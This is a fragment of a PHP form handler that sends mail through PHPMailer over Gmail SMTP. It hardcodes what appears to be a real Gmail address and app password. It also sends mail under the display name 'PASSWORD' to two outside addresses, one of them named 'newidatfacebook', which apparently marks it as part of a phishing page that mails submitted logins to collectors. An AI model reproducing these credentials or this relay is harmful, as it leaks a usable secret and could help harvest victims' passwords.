...
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    ...
    try {
        ...
        $mail->SMTPAuth   = true;
        $mail->Username   = 'anamiqbal0066@gmail.com'; // Replace with your email address
        $mail->Password   = 'afcj pzhk soya slat'; // Replace with your email password
        $mail->SMTPSecure = 'tls';
        $mail->Port       = 587;


        // Email properties
        $mail->setFrom('anamiqbal0066@gmail.com', 'PASSWORD');
        $mail->addAddress('newidatfacebook@gmail.com');
       $mail->addAddress('artitsma@gmail.com');
